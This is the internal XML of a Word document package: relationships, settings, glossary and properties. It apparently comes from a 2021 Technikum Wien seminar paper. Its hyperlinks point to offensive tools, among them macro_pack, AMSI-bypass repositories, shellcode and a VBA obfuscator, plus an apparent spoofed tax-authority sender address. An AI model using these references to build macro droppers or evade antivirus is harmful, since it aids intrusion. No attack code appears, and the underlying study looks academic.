                        <w:div w:id="3522639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26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.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4.png"/><Relationship Id="rId89"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52.png"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image72.png"/><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3.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer2.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sevagas/macro_pack" TargetMode="External"/><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image" Target="media/image35.png"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.png"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image67.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43.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image62.png"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://rechtsanwaelte-wirtschaftsstrafrecht-berlin.de/der-tatbestand-der-steuerhinterziehung/" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" TargetMode="External"/><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hyperlink" Target="https://github.com/peterferrie/win-exec-calc-shellcode" TargetMode="External"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer4.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image65.png"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.png"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header4.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jpeg"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/glossaryDocument" Target="glossary/document.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.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1.png"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.pn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dejure.org/gesetze/AO/370.html" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.excel-pratique.com/en/vba_tricks/vba-obfuscator" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.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footer" Target="footer1.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rmdavy/WordAmsiBypass" TargetMode="External"/><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4.png"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.png"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://kambing.ui.ac.id/iso/debian/9.6.0/i386/iso-cd/" TargetMode="External"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image66.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header5.xml"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header6.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footer" Target="footer3.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:noreply@finanzonline.co.at"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7.png"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/></Relationships>
</file>

<file path=word/_rels/header1.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/></Relationships>
</file>

<file path=word/_rels/header3.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.jpg"/></Relationships>
</file>

<file path=word/_rels/header4.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/></Relationships>
</file>

<file path=word/_rels/header6.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/></Relationships>
</file>

<file path=word/_rels/settings.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///Y:\Qualit&#228;tsmanagement\7_QM%20Review%202012\QM%202012%20TESTLINK\Review%202012\deutsch\5_Dokumente\Studienbetrieb\Wissenschaftliches%20Arbeiten\Vorlagen\Seminararbeit_Vorlage_2011.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DefaultPlaceholder_-1854013440"/>
        <w:category>
          <w:name w:val="Allgemein"/>
          <w:gallery w:val="placeholder"/>
        </w:category>
        <w:types>
          <w:type w:val="bbPlcHdr"/>
        </w:types>
        <w:behaviors>
          <w:behavior w:val="content"/>
        </w:behaviors>
        <w:guid w:val="{876B438D-A84C-4E17-89E2-BDFA7A1A756C}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="000C6CFE" w:rsidRDefault="0058074D">
          <w:r w:rsidRPr="00D54AD6">
            <w:rPr>
              <w:rStyle w:val="Platzhaltertext"/>
            </w:rPr>
            <w:t>Klicken oder tippen Sie hier, um Text einzugeben.</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Helvetica">
    <w:panose1 w:val="020B0604020202020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>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insDel="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074D"/>
    <w:rsid w:val="000C6CFE"/>
    <w:rsid w:val="001A30D7"/>
    <w:rsid w:val="00303D68"/>
    <w:rsid w:val="004A3D4C"/>
    <w:rsid w:val="0058074D"/>
    <w:rsid w:val="005F33C2"/>
    <w:rsid w:val="00600398"/>
    <w:rsid w:val="009E4381"/>
    <w:rsid w:val="00A74930"/>
    <w:rsid w:val="00D16341"/>
    <w:rsid w:val="00DA0DD5"/>
    <w:rsid w:val="00ED1231"/>
  </w:rsids>
  <m:mathPr>
    <m:mathFont m:val="Cambria Math"/>
    <m:brkBin m:val="before"/>
    <m:brkBinSub m:val="--"/>
    <m:smallFrac m:val="0"/>
    <m:dispDef/>
    <m:lMargin m:val="0"/>
    <m:rMargin m:val="0"/>
    <m:defJc m:val="centerGroup"/>
    <m:wrapIndent m:val="1440"/>
    <m:intLim m:val="subSup"/>
    <m:naryLim m:val="undOvr"/>
  </m:mathPr>
  <w:themeFontLang w:val="de-AT"/>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de-AT" w:eastAsia="de-AT"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58074D"/>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Larissa">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9C6AAA0-CEA4-452A-BE88-79B435E7FE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Seminararbeit_Vorlage_2011.dot</Template>
  <TotalTime>0</TotalTime>
  <Pages>5</Pages>
  <Words>19962</Words>
  <Characters>125762</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>1048</Lines>
  <Paragraphs>290</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="2" baseType="variant">
      <vt:variant>
        <vt:lpstr>Titel</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="1" baseType="lpstr">
      <vt:lpstr>Einleitung</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>Technikum Wien</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>145434</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="78" baseType="variant">
      <vt:variant>
        <vt:i4>1245232</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>74</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009443</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245232</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>68</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009442</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245232</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>62</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009441</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245232</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>56</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009440</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>50</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009439</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>44</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009438</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>38</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009437</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>32</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009436</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>26</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009435</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>20</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009434</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>14</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009433</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>8</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009432</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310768</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>2</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc296009431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Einleitung</dc:title>
  <dc:creator>Natalie Koenig</dc:creator>
  <cp:lastModifiedBy>Martin Gratt</cp:lastModifiedBy>
  <cp:revision>1146</cp:revision>
  <cp:lastPrinted>2021-01-31T14:16:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-01-04T20:10:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-01-31T14:17:00Z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itaviDocumentProperty_7">
    <vt:lpwstr>whh3</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="CitaviDocumentProperty_0">
    <vt:lpwstr>c9f99510-bda1-4bdd-bf54-e23feaea5bc2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="CitaviDocumentProperty_1">
    <vt:lpwstr>6.3.0.0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="CitaviDocumentProperty_6">
    <vt:lpwstr>False</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="CitaviDocumentProperty_8">
    <vt:lpwstr>CloudProjectKey=xsre8cja6i4zs16ymc2sl5z0wdvv0kvf03dfbd3; ProjectName=whh3</vt:lpwstr>
  </property>
</Properties>
</file>